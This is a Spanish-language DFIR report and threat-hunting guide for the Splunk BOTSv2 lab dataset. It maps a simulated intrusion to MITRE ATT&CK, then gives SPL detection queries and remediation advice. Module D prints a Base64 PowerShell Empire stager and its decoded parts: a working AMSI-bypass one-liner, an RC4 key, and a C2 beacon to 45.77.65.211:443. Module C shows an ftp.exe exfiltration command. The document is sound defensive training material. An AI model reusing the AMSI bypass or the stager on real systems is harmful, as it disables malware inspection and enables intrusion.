
# INFORME DE AUDITORÍA DFIR Y GUÍA TÉCNICA DE THREAT HUNTING: BOTSv2

**Clasificación:** TLP:AMBER (Uso Interno — SOC / Threat Hunting / CIRT)  
**Plataforma de Análisis:** Splunk Enterprise / Splunk Enterprise Security (ES)  
**Dataset:** Boss of the SOC v2 (index=botsv2)  
**Entorno Afectado:** Corporación Frothly / AmberTuring  
**Rol:** Senior Threat Hunter & Lead DFIR Analyst

---

## 1. Escenario y Contexto de la Amenaza

### 1.1 Resumen Ejecutivo del Incidente

El equipo de Operaciones de Seguridad (SOC) y Respuesta a Incidentes (CIRT) ha documentado y correlacionado una intrusión dirigida contra los activos de **Frothly / AmberTuring**. La agresión combinó vectores perimetrales e internos a través de tres fases operativas:

1. **Vector Perimetral Web/BD:** Reconocimiento activo, fuzzing masivo y explotación de Inyección SQL (SQLi) sobre endpoints de la tienda Magento y la base de datos MySQL en el servidor gacrux.
    
2. **Abuso de Identidad y Movimiento Lateral:** Compromiso y abuso volumétrico anómalo de la cuenta de servicio de dominio service3, utilizada para pivotar mediante autenticaciones de red (Logon Type 3) hacia el servidor de producción mercury.frothly.local (IP interna 10.0.1.1).
    
3. **Control Local, Evasión Avanzada y Exfiltración:** Ejecución remota sin interacción interactiva de consola (WinRM / wsmprovhost.exe), evasión de defensas en memoria parcheando la interfaz AMSI (Antimalware Scan Interface), ejecución de un stager de PowerShell con cifrado simétrico RC4, masquerading de binarios de monitorización (splunk-winprintmon.exe), y exfiltración de activos mediante el LOLBin ftp.exe con scripts de comandos encubiertos.
    

### 1.2 Catálogo y Normalización de Telemetría (index=botsv2)

|   |   |   |
|---|---|---|
|Sourcetype|Dimensión de Visibilidad|Eventos / Campos Clave|
|WinEventLog:Security|Auditoría de identidad y autenticación Windows|**4624** (Logon exitoso), **4625** (Fallo de logon), **4688** (Creación de procesos), Logon_Type, Source_Network_Address, Account_Name.|
|XmlWinEventLog:Microsoft-Windows-Sysmon/Operational|Telemetría profunda de endpoints|**EventCode 1** (Process Create con hashes y CLI íntegra), **3** (Network Connect), **11** (File Create), **13** (Registry Set).|
|mysql:transaction:details|Auditoría transaccional de base de datos|SQL_TEXT, sentencias DML/DDL, tablas de sistema (information_schema).|
|stream:http|Tráfico HTTP transaccional no cifrado|uri, status, http_user_agent, src_ip, dest_ip, bytes transferidos.|
|stream:dns|Consultas y resolución de nombres|Consultas anómalas, cálculo de entropía, túneles encubiertos.|
|suricata|Firmas e inspección NIDS perimetral|Reglas ET (Emerging Threats), clasificaciones CVE, severidad.|

---

## 2. Matriz MITRE ATT&CK® Mapeada

|   |   |   |   |
|---|---|---|---|
|Táctica|ID Técnica|Subtécnica / Nombre|Evidencia Identificada en BOTSv2|
|**Reconnaissance**|T1595.002|Active Scanning: Vulnerability Scanning|Fuzzing con herramientas automáticas (sqlmap, Acunetix) desde 45.77.65.211.|
|**Initial Access**|T1190  <br>T1078.002|Exploit Public-Facing Application  <br>Valid Accounts: Domain Accounts|SQLi en catálogo de Magento / Abuso de credenciales válidas del usuario service3.|
|**Execution**|T1059.001  <br>T1059.003|PowerShell  <br>Windows Command Shell|Ejecución de powershell.exe -enc y llamadas secundarias con cmd.exe /c.|
|**Persistence**|T1053.005|Scheduled Task|Manipulación y eliminación forzada de tareas del sistema mediante schtasks.exe.|
|**Privilege Escalation**|T1055|Process Injection|Carga de stagers en la memoria de procesos nativos.|
|**Defense Evasion**|T1562.001  <br>T1027  <br>T1036.003|Impair Defenses: Disable/Modify Tools  <br>Obfuscated Files or Information  <br>Masquerading|Parcheo en memoria de AmsiUtils.amsiInitFailed.  <br>Cifrado RC4 y Base64 en memoria.  <br>Uso de binarios maliciosos simulando ser agentes Splunk (splunk-winprintmon.exe).|
|**Discovery**|T1033  <br>T1082  <br>T1049|System Owner/User Discovery  <br>System Information Discovery  <br>System Network Connections|Ejecución de whoami /user.  <br>Consulta masiva al registro reg query HKLM\...\Uninstall.  <br>Inspección de sockets con netstat -nao.|
|**Lateral Movement**|T1021.006|Remote Services: Windows Remote Management|Creación de subprocesos bajo el host WinRM (wsmprovhost.exe -Embedding).|
|**Command & Control**|T1071.001|Application Layer Protocol: Web Protocols|Balizamiento persistente hacia C2 externo 45.77.65.211:443 simulando sesiones web.|
|**Exfiltration**|T1048.003|Exfiltration Over Alternative Protocol: Non-C2|Uso del LOLBin interactivo ftp.exe -i -s:winsys32.dll para transferencias desatendidas.|

---

## 3. Investigaciones Forenses y Consultas SPL

---

### Módulo A: Vector Perimetral — SQLi y Enumeración Masiva

#### 1. Hipótesis Operativa

El atacante externo está ejecutando inyecciones SQL automatizadas contra el host de base de datos MySQL (gacrux), buscando extraer metadatos de configuración del servidor antes de intentar exfiltrar registros de usuarios.

#### 2. Consulta SPL: Detección y Conteo de Consultas Maliciosas


``` SPL
index=botsv2 sourcetype="mysql:transaction:details"
| rex field=SQL_TEXT "(?i)(?P<sqli_technique>UNION\s+ALL\s+SELECT|UNION\s+SELECT|CONCAT|GROUP_CONCAT|INFORMATION_SCHEMA\.[A-Za-z0-9_]+|CHAR\(|BENCHMARK|SLEEP\()"
| where isnotnull(sqli_technique)
| stats 
    count as volumen_consultas,
    values(sqli_technique) as tecnicas_detectadas,
    earliest(_time) as inicio_ataque,
    latest(_time) as fin_ataque
    by SQL_TEXT
| sort - volumen_consultas
| head 10
```

#### 3. Correlación Perimetral Web (Identificación de la IP del Atacante)


```SPL
index=botsv2 sourcetype="stream:http" uri="*UNION*" OR uri="*information_schema*"
| stats 
    count as peticiones,
    values(http_user_agent) as user_agents,
    values(status) as estados_http
    by src_ip, dest_ip
| sort - peticiones
```

#### 4. Análisis Forense

- **Vector Confirmado:** Intentos recurrentes de inyección SQL basados en UNION SELECT dirigidos a INFORMATION_SCHEMA.session_variables.
    
- **Atribución Perimetral:** El tráfico se origina en la dirección IP pública 45.77.65.211. La aplicación web canalizó las peticiones a la base de datos interna, confirmando un escaneo exhaustivo de metadatos del motor MySQL sin compromiso de tablas de contraseñas en este host.
    

---

### Módulo B: Análisis de Autenticación Anómala y Movimiento Lateral (service3)

#### 1. Hipótesis Operativa

Tras la actividad perimetral, el actor de amenazas utilizó credenciales corporativas comprometidas (cuenta de servicio service3) para acceder internamente al host de misión crítica mercury.frothly.local (IP origen 10.0.1.1), empleando autenticaciones no interactivas en volumen masivo.

#### 2. Consulta SPL: Identificación de Logons Anómalos por Volumen y Tipo


``` SPL
index=botsv2 sourcetype="WinEventLog:Security" EventCode=4624
| stats 
    count as Total_Logons,
    earliest(_time) as Primer_Acceso,
    latest(_time) as Ultimo_Acceso,
    dc(Logon_Type) as Tipos_Logon_Distintos,
    values(Logon_Type) as Modos_Logon
    by Account_Name, Source_Network_Address, ComputerName, Workstation_Name
| eval Frecuencia_Por_Minuto=round(Total_Logons / ((Ultimo_Acceso - Primer_Acceso)/60), 2)
| convert ctime(Primer_Acceso) ctime(Ultimo_Acceso)
| where Total_Logons > 1000
| sort - Total_Logons
```

#### 3. Análisis Forense

- **Anomalía de Volumen:** La cuenta de servicio service3 registró más de 8,600 autenticaciones exitosas en un intervalo acotado (y más de 300,000 en la ventana agregada).
    
- **Modo de Logon:** Los accesos correspondieron exclusivamente a **Logon_Type 3 (Network Logon)** originados desde la estación interna 10.0.1.1 hacia mercury.frothly.local.
    
- **Diagnóstico:** Esta frecuencia temporal excede el comportamiento humano legítimo, confirmando el uso de herramientas de automatización post-explotación para validación de credenciales y establecimiento de túneles remotos.
    

---

### Módulo C: Ejecución Remota, Masquerading y Proliferación de LOLBins

#### 1. Hipótesis Operativa

El atacante ha ejecutado procesos remotos sin sesión de consola interactiva a través del servicio WinRM (wsmprovhost.exe), ejecutando binarios utilitarios legítimos del sistema operativo (Living-off-the-Land Binaries) y herramientas camufladas para reconocimiento y persistencia.

#### 2. Consulta SPL: Extracción de Línea de Comandos y Procesos Derivados


``` SPL
index=botsv2 host="mercury" sourcetype="WinEventLog:Security" EventCode=4688
| rex field=_raw "Process Command Line:\s+(?<CommandLineExecuted>.+)"
| eval CommandLine=coalesce(CommandLine, CommandLineExecuted)
| stats 
    count as Conteo_Ejecuciones, 
    values(CommandLine) as Lineas_De_Comando 
    by Account_Name, New_Process_Name
| sort - Conteo_Ejecuciones
```

#### 3. Catálogo Forense y Caracterización de Procesos Amenazantes

A través de la correlación cruzada de telemetría entre WinEventLog:Security (4688) y Sysmon (EventCode 1), se categorizaron las siguientes amenazas ejecutadas por el usuario service3:


```CODE
[svchost.exe] (WinRM Service)
                                      |
                             [wsmprovhost.exe] (T1021.006 - WinRM Worker)
                                      |
         +----------------------------+----------------------------+-----------------------+
         |                            |                            |                       |
    [whoami.exe]               [powershell.exe]              [schtasks.exe]            [ftp.exe]
(T1033 - User Disc.)         (T1059.001 / T1562.001)       (T1053.005 - Persist.)  (T1048.003 - Exfil)
                                      |
                             [AMSI Bypass (Memory)]
                             [RC4 In-Memory Stager]
```

- **wsmprovhost.exe (Windows Remote Management Host):**  
    Contexto Táctico: Componente del subsistema WinRM. Su aparición como proceso padre evidencia que el adversario operaba de manera remota mediante WinRM/PowerShell Remoting, sin interactuar de forma física ni interactiva con el escritorio de mercury.
    
- **powershell.exe (Motor de Ejecución Principal):**  
    Contexto Táctico: Empleado con los modificadores -enc (código codificado) y -sta (Single-Threaded Apartment) para ejecutar scripts directamente en la memoria volátil, evitando que herramientas antivirus basadas en firmas detecten artefactos en el sistema de archivos.
    
- **splunk-winprintmon.exe (Técnica de Masquerading / Evasión):**  
    Contexto Táctico: Binario colocado para simular los procesos del Universal Forwarder de Splunk. Su objetivo es disimular el malware en el Administrador de Tareas y en los reportes de auditoría estándar, aprovechando la confianza en las rutas de monitorización corporativas.
    
- **schtasks.exe (Manipulación de Tareas Programadas):**  
    Contexto Táctico: Invocado con flags forzados (/delete /f /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader"). El atacante sustituyó una tarea nativa legítima de Windows para incrustar sus scripts y garantizar persistencia ante reinicios del sistema, minimizando alertas al no crear tareas con nombres atípicos.
    
- **whoami.exe / reg.exe / netstat.exe (Reconocimiento y Enumeración Local):**  
    Contexto Táctico:
    
    - whoami /user: Inspección del Security Identifier (SID) y privilegios asignados al token de service3.
        
    - reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall": Mapeo exhaustivo del catálogo de software desplegado en mercury, buscando dependencias vulnerables para una posible escalada de privilegios locales.
        
    - netstat -nao | findstr /r "LISTENING": Mapeo de puertos locales abiertos para pivotar hacia otros servicios.
        
- **ftp.exe (Exfiltración Automatizada con LOLBin):**  
    Contexto Táctico: Invocado mediante la sintaxis silenciosa ftp.exe -i -s:winsys32.dll.  
    El parámetro -s:winsys32.dll no referencia una librería dinámica, sino un script de texto plano estructurado que contiene las directivas FTP de subida (open <IP_C2>, credenciales codificadas, comando put <archivo_comprimido>). El flag -i desactiva confirmaciones interactivas, permitiendo una extracción desatendida.
    

---

### Módulo D: Ingeniería Inversa del Stager PowerShell (Bypass de AMSI y Balizamiento C2)

#### 1. Extracción y Desofuscación Analítica

La consulta sobre la línea de comandos ejecutada por powershell.exe bajo el contexto de service3 reveló la siguiente cadena codificada en Base64 (Unicode UTF-16LE):


```TEXT
WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkARQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAHUARQAoACQATgBVAEwAbAAsACQAdAByAFUARQApAH0AOwBbAFMAWQBzAHQARQBNAC4ATgBlAHQALgBTAEUAUgB2AGkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAEcAZQByAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBuAHUARQA9ADAAOwAkAFcAYwA9AE4AZQBXAC0ATwBiAGoAZQBjAHQAIABTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBlAEIAQwBMAEkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AEeQBtAC4ATgB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBDAC4ASABFAGEARABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAG8AeABZAD0AWwBTAFkAcwB0AEUAbQAuAE4AZQBUAC4AVwBFAEIAUgBFAFEAVQBlAHMAdABdADoAOgBEAGUARgBhAHUAbABUAFcARQBCAFAAUgBPAHgAWQA7ACQAVwBjAC4AUAByAG8AeABZAC4AQwBSAGUARABlAG4AVABpAGEATABzACAAPQAgAFsAUwB5AHMAVABlAG0ALgBOAGUAVAAuAEMAcgBlAGQARQBuAHQASQBBAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAEEAdQBsAHQATgBlAFQAVwBvAHIAawBDAHIARQBEAGUATgBUAEkAQQBsAHMAOwAkAEsAPQBbAFMAeQBzAFQAZQBtAC4AVABlAHgAVAAuAEUAbgBjAE8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AE0AdgBDAGQAZABkAFAAcQBGAFEANQA0AFYATAA0AE8AVwBVADUAcgB5AFIAVABVAGkAcgA4AD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACc...
```

#### 2. Deconstrucción Técnica del Código Desofuscado

Al decodificar la cadena Base64, se expone un stager perteneciente al framework post-explotación **PowerShell Empire**, compuesto por tres etapas:

1. **Evasión de Antivirus mediante Parcheo de AMSI (In-Memory Patching):**
    

    
    ``` Powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
      ?{$_} |
      %{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
    ```
    
    Efecto: Manipula por reflexión el campo estático interno amsiInitFailed de la clase AmsiUtils. Al forzar su valor a $true, el motor de scripting asume que la inicialización del motor antimalware falló, desactivando la inspección de código posterior sin requerir privilegios de administrador ni modificar archivos en disco.
    
2. **Cifrado de Carga Útil con Algoritmo RC4:**
    
    
    ``` Powershell
    $K=[System.Text.Encoding]::ASCII.GetBytes('389288edd78e2ad2f54946d3209b16b8');
    # Inicialización de la permutación S-Box (KSA y PRGA) para el descifrado simétrico de la carga útil...
    ```
    
    Efecto: El código malicioso secundario se descarga o ejecuta a través de un búfer de memoria cifrado con la clave precompartida (389288edd78e2ad2f54946d3209b16b8). Esto impide que los sistemas de inspección de red basados en firmas (NIDS/DPI) detecten el tráfico como malicioso en tránsito.
    
3. **Canal de Mando y Control (C2 Beaconing):**
    
    
    ``` Powershell
    $wc.Headers.Add("Cookie","session=MvCddPqFQ54VL4OWU5ryRTUir8=");
    $ser='https://45.77.65.211:443';
    ```
    
    Efecto: Establece un canal de comunicación web cifrado contra el servidor del atacante en 45.77.65.211:443, simulando tráfico de navegación legítimo con cabeceras de usuario simuladas y una cookie de sesión para identificar al agente comprometido en mercury.
    

---

## 4. Reglas de Detección e Ingeniería de Detección (SPL)

### Regla 1: Desactivación / Evasión de AMSI en Memoria (Sysmon / PowerShell ScriptBlock)

- **Técnica MITRE ATT&CK:** T1562.001
    
- **Severidad:** Crítica
    
- **Objetivo:** Alertar sobre cualquier intento de manipulación por reflexión de AmsiUtils antes de la ejecución de payloads en memoria.
    


``` SPL
index=botsv2 (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1) OR (sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104)
| eval ScriptData=coalesce(CommandLine, ScriptBlockText)
| regex ScriptData="(?i)AmsiUtils.*amsiInitFailed|\[Ref\]\.Assembly\.GetType\(.*AmsiUtils"
| stats 
    count, 
    earliest(_time) as firstSeen, 
    latest(_time) as lastSeen, 
    values(Computer) as Equipos, 
    values(User) as Usuarios 
    by ScriptData
| convert ctime(firstSeen) ctime(lastSeen)
| eval AlertName="Evasión de Defensas: Intento de Neutralización de AMSI en Memoria"
```

- **Tuning y Falsos Positivos:** El acceso a los campos privados de AmsiUtils no forma parte de flujos operativos legítimos. No se contemplan falsos positivos en entornos corporativos estándar; cualquier coincidencia debe tratarse como un incidente de severidad alta.
    

---

### Regla 2: Ejecución Anómala de Subprocesos desde WinRM (wsmprovhost.exe)

- **Técnica MITRE ATT&CK:** T1021.006 / T1059
    
- **Severidad:** Alta
    
- **Objetivo:** Detectar procesos de reconocimiento, evasión o ejecución invocados de forma remota a través del servicio WinRM.
    


``` SPL
index=botsv2 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| eval Parent=lower(ParentImage), Child=lower(Image)
| where match(Parent, "\\wsmprovhost\.exe$") 
    AND match(Child, "\\(powershell|cmd|whoami|reg|net|net1|schtasks|ftp|certutil)\.exe$")
| stats 
    count, 
    earliest(_time) as firstTime, 
    latest(_time) as lastTime 
    by host, User, ParentImage, Image, CommandLine
| convert ctime(firstTime) ctime(lastTime)
| eval AlertName="Movimiento Lateral: Ejecución de LOLBins vía WinRM"
```

- **Tuning y Falsos Positivos:** Scripts legítimos de administración centralizada (Ansible, Microsoft Endpoint Configuration Manager).
    
- **Mitigación de Ruido:** Filtrar por cuentas de automatización autorizadas y verificar que las líneas de comando coincidan con tareas programadas de mantenimiento documentadas.
    

---

### Regla 3: Uso Sospechoso de ftp.exe con Parámetros Desatendidos (LOLBin Exfiltration)

- **Técnica MITRE ATT&CK:** T1048.003
    
- **Severidad:** Alta
    
- **Objetivo:** Identificar la invocación de clientes FTP heredados leyendo configuraciones estructuradas con nombres de archivo anómalos.
    


``` SPL
index=botsv2 (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1) OR (sourcetype="WinEventLog:Security" EventCode=4688)
| eval Process=lower(coalesce(Image, New_Process_Name)), CLI=lower(coalesce(CommandLine, Process_Command_Line, _raw))
| where match(Process, "\\ftp\.exe$") AND match(CLI, "-s:[a-z0-9_\\.-]+")
| rex field=CLI "-s:(?<ScriptFile>[^\s]+)"
| stats 
    count, 
    values(CLI) as CommandLines, 
    values(host) as Equipos, 
    values(User) as Usuarios 
    by ScriptFile
| eval AlertName="Exfiltración Potencial: Ejecución Desatendida de FTP con Script Embebido"
```

- **Tuning y Falsos Positivos:** Sistemas legacy de transferencia de archivos por lotes (batch).
    
- **Mitigación de Ruido:** Limitar la alerta a extensiones no habituales de scripts (.dll, .tmp, .dat, .log) y excluir cuentas de servicio homologadas.
    

---

## 5. Recomendaciones de Remediación y Hardening

### 5.1 Plan de Contención y Erradicación Inmediata

codeCode

1. **Aislamiento de Red:** Segregar el servidor mercury.frothly.local del segmento de producción mediante políticas de EDR o control en el switch/firewall interno para interrumpir el balizamiento C2 y la ejecución remota.
    
2. **Revocación y Rotación de Identidades:**
    
    - Deshabilitar inmediatamente la cuenta service3.
        
    - Invalidar todos los tickets Kerberos del dominio (krbtgt reset dos veces) para neutralizar posibles movimientos laterales basados en Pass-the-Ticket o tickets forjados.
        
3. **Bloqueo Perimetral de IOCs:**
    
    - Incluir la dirección IP 45.77.65.211 en la lista negra del firewall perimetral y WAF corporativo.
        
    - Denegar el tráfico saliente directo por puertos no estándar y bloquear peticiones con la cookie maliciosa session=MvCddPqFQ54VL4OWU5ryRTUir8=.
        
4. **Erradicación de Artefactos:**
    
    - Eliminar el archivo de instrucciones winsys32.dll y los archivos temporales generados en C:\Users\service3\AppData\Local\Temp\*.
        
    - Restablecer la tarea programada Microsoft\Windows\Customer Experience Improvement Program\Uploader a su estado original firmado por Microsoft.
        
    - Inspeccionar y validar los hashes criptográficos de la carpeta C:\Program Files\SplunkUniversalForwarder\ para retirar cualquier binario renombrado (splunk-winprintmon.exe).
        

### 5.2 Endurecimiento de la Infraestructura (Hardening)

#### Directivas de Grupo (GPO) y Protección de Endpoints

- **Restricción de PowerShell:**
    
    - Implementar **Constrained Language Mode (CLM)** mediante directivas de Windows Defender Application Control (WDAC) o AppLocker. Esto impide que sesiones de PowerShell no interactivas invoquen tipos .NET arbitrarios como System.Management.Automation.AmsiUtils o métodos de System.Net.WebClient.
        
- **Auditoría Avanzada de PowerShell:**
    
    - Activar de forma centralizada por GPO:
        
        - PowerShell Script Block Logging (Event ID 4104).
            
        - PowerShell Transcription Logging en un recurso compartido de red seguro y de solo escritura.
            
- **Control de Ejecución de LOLBins:**
    
    - Bloquear la ejecución de clientes heredados no seguros como ftp.exe, tftp.exe o certutil.exe para usuarios estándar y cuentas de servicio, limitando la transferencia de datos únicamente a canales administrados y autenticados (SFTP/HTTPS con control de acceso basado en roles).
        

#### Gestión de Cuentas de Servicio y Servicios de Gestión Remota

- **Migración a gMSA:** Convertir cuentas de servicio compartidas como service3 en **Group Managed Service Accounts (gMSA)**, delegando la gestión de contraseñas de alta entropía a Active Directory y eliminando el riesgo de uso interactivo no autorizado.
    
- **Restricción de Acceso por WinRM:**
    
    - Restringir el acceso a los endpoints de WinRM (TCP 5985/5986) aplicando reglas de firewall de host (Windows Defender Firewall) para aceptar conexiones exclusivamente desde estaciones de trabajo de administración seguras (Privileged Access Workstations - PAWs).
        
- **Segmentación de Red Interna:**
    
    - Establecer microsegmentación de red para evitar que máquinas de segmentos de usuario (10.0.1.0/24) puedan alcanzar directamente los puertos de administración de los servidores de bases de datos o controladores de dominio sin pasar por un bastion host con MFA forzado.